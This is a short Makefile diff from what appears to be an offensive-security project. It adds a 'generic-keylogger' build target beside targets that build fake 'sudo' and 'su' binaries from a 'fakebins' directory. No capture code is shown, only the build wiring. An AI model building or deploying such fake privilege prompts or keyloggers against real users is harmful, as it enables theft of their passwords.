@@ -26,7 +26,7 @@ all: .obj/libtas.a
 	@echo "  CC $@"
 	@$(CC) $(CFLAGS) -c -o $@ $< $(LDFLAGS)
 
-.PHONY: sudo su
+.PHONY: sudo su generic-keylogger
 sudo: .obj/libtas.a
 	@$(MAKE) -C fakebins/sudo
 
